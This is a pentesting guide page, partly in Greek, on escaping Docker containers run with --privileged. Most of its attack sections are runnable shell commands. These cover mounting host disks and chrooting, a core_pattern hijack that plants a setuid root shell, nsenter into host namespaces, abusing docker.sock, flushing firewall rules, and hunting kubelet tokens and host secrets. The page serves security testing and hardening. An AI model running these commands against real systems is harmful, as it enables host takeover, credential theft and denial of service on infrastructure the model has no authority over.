# Escaping From `--privileged` Containers

{{#include ../../../banners/hacktricks-training.md}}

## Overview

Ένα container που ξεκινάει με `--privileged` δεν είναι το ίδιο με ένα κανονικό container που έχει μία ή δύο επιπλέον άδειες. Στην πράξη, το `--privileged` αφαιρεί ή εξασθενεί αρκετές από τις προεπιλεγμένες runtime προστασίες που κανονικά κρατούν το workload μακριά από επικίνδυνους πόρους του host. Η ακριβής επίπτωση εξαρτάται ακόμα από το runtime και το host, αλλά για το Docker το συνηθισμένο αποτέλεσμα είναι:

- all capabilities are granted
- the device cgroup restrictions are lifted
- many kernel filesystems stop being mounted read-only
- default masked procfs paths disappear
- seccomp filtering is disabled
- AppArmor confinement is disabled
- SELinux isolation is disabled or replaced with a much broader label

Το σημαντικό συμπέρασμα είναι ότι ένα privileged container συνήθως δεν χρειάζεται κάποιο λεπτό kernel exploit. Σε πολλές περιπτώσεις μπορεί απλά να αλληλεπιδράσει με host devices, kernel filesystems που είναι ορατά από το host, ή runtime interfaces απευθείας και μετά να pivot σε ένα host shell.

## What `--privileged` Does Not Automatically Change

Το `--privileged` does **not** automatically join the host PID, network, IPC, or UTS namespaces. Ένα privileged container μπορεί να εξακολουθεί να έχει private namespaces. Αυτό σημαίνει ότι μερικές αλυσίδες απόδρασης απαιτούν μια επιπλέον προϋπόθεση, όπως:

- a host bind mount
- host PID sharing
- host networking
- visible host devices
- writable proc/sys interfaces

Αυτές οι προϋποθέσεις συχνά είναι εύκολες να ικανοποιηθούν σε πραγματικές misconfigurations, αλλά είναι εννοιολογικά ξεχωριστές από το `--privileged` αυτό καθαυτό.

## Escape Paths

### 1. Mount The Host Disk Through Exposed Devices

Ένα privileged container συνήθως βλέπει πολύ περισσότερους device nodes κάτω από το `/dev`. Αν το host block device είναι ορατό, η πιο απλή απόδραση είναι να το mount-άρει και να κάνει `chroot` στο filesystem του host:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
Εάν το root partition δεν είναι προφανές, καταγράψτε πρώτα το block layout:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
Αν η πρακτική επιλογή είναι να τοποθετήσετε έναν setuid helper σε ένα writable host mount αντί να χρησιμοποιήσετε `chroot`, θυμηθείτε ότι δεν κάθε filesystem σέβεται το setuid bit. Ένας γρήγορος host-side capability check είναι:
```bash
mount | grep -v "nosuid"
```
Αυτό είναι χρήσιμο γιατί τα εγγράψιμα μονοπάτια κάτω από συστήματα αρχείων με `nosuid` είναι πολύ λιγότερο ενδιαφέροντα για τις κλασικές ροές εργασίας "drop a setuid shell and execute it later".

Οι αποδυναμωμένες προστασίες που καταχρώνται εδώ είναι:

- πλήρης έκθεση συσκευών
- ευρείες capabilities, ειδικά `CAP_SYS_ADMIN`

Σχετικές σελίδες:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Τοποθέτηση ή επαναχρησιμοποίηση ενός host bind mount και `chroot`

Εάν το root filesystem του host είναι ήδη mounted μέσα στο container, ή αν το container μπορεί να δημιουργήσει τις απαραίτητες mounts επειδή είναι privileged, ένα host shell συχνά απέχει μόνο ένα `chroot`:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Εάν δεν υπάρχει host root bind mount αλλά host storage είναι προσβάσιμο, δημιουργήστε ένα:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
Αυτή η διαδρομή εκμεταλλεύεται:

- αποδυναμωμένους περιορισμούς mount
- πλήρεις capabilities
- έλλειψη MAC confinement

Σχετικές σελίδες:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Εκμετάλλευση εγγράψιμων `/proc/sys` ή `/sys`

Ένα από τα σημαντικότερα αποτελέσματα του `--privileged` είναι ότι οι προστασίες του procfs και του sysfs αποδυναμώνονται σημαντικά. Αυτό μπορεί να εκθέσει host-facing kernel interfaces που συνήθως είναι masked ή mounted ως read-only.

Ένα κλασικό παράδειγμα είναι το `core_pattern`:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Άλλα μονοπάτια υψηλής αξίας περιλαμβάνουν:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Αυτή η διαδρομή εκμεταλλεύεται:

- missing masked paths
- missing read-only system paths

Related pages:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Use Full Capabilities For Mount- Or Namespace-Based Escape

Ένα privileged container λαμβάνει τις capabilities που κανονικά αφαιρούνται από standard containers, συμπεριλαμβανομένων των `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN`, και πολλών άλλων. Αυτό συχνά αρκεί για να μετατρέψει ένα local foothold σε host escape μόλις υπάρξει κάποια άλλη εκτεθειμένη επιφάνεια.

Ένα απλό παράδειγμα είναι το mounting επιπλέον filesystems και η χρήση namespace entry:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
Αν το host PID μοιράζεται επίσης, το βήμα γίνεται ακόμα πιο σύντομο:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Αυτή η διαδρομή εκμεταλλεύεται:

- το προεπιλεγμένο privileged capability set
- προαιρετικό host PID sharing

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Διαφυγή μέσω runtime sockets

Ένα privileged container συχνά καταλήγει να έχει ορατή την κατάσταση runtime του host ή τα sockets. Εάν ένα Docker, containerd, ή CRI-O socket είναι προσβάσιμο, η απλούστερη προσέγγιση είναι συχνά η χρήση του runtime API για να εκκινήσει ένα δεύτερο container με πρόσβαση στον host:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Για containerd:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Αυτό το μονοπάτι εκμεταλλεύεται:

- privileged runtime exposure
- host bind mounts που δημιουργούνται μέσω του runtime

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Αφαιρέστε τις Παρενέργειες Απομόνωσης Δικτύου

`--privileged` δεν ενώνει από μόνο του το host network namespace, αλλά αν το container έχει επίσης `--network=host` ή άλλο host-network access, ολόκληρο το network stack γίνεται μεταβλητό:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Αυτό δεν είναι πάντα ένα άμεσο shell στον host, αλλά μπορεί να οδηγήσει σε denial of service, υποκλοπή κυκλοφορίας ή πρόσβαση σε υπηρεσίες διαχείρισης προσβάσιμες μόνο μέσω loopback.

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Ανάγνωση μυστικών του host και κατάστασης runtime

Ακόμα κι όταν ένα clean shell escape δεν είναι άμεσο, τα privileged containers συχνά έχουν επαρκή πρόσβαση για να διαβάσουν host secrets, kubelet state, runtime metadata, και τα filesystems των γειτονικών containers:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
Αν το `/var` είναι host-mounted ή οι runtime κατάλογοι είναι ορατοί, αυτό μπορεί να αρκεί για lateral movement ή cloud/Kubernetes credential theft ακόμα και πριν αποκτηθεί host shell.

Σχετικές σελίδες:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Έλεγχοι

Ο σκοπός των παρακάτω εντολών είναι να επιβεβαιώσουν ποιες privileged-container escape families είναι άμεσα εφικτές.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
Τι είναι ενδιαφέρον εδώ:

- ένα πλήρες capability set, ειδικά `CAP_SYS_ADMIN`
- έκθεση εγγράψιμου proc/sys
- ορατές συσκευές του host
- απουσία seccomp και MAC confinement
- runtime sockets ή host root bind mounts

Οποιοδήποτε από αυτά μπορεί να είναι αρκετό για post-exploitation. Πολλά μαζί συνήθως σημαίνουν ότι το container είναι λειτουργικά ένα ή δύο εντολές μακριά από host compromise.

## Σχετικές Σελίδες

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
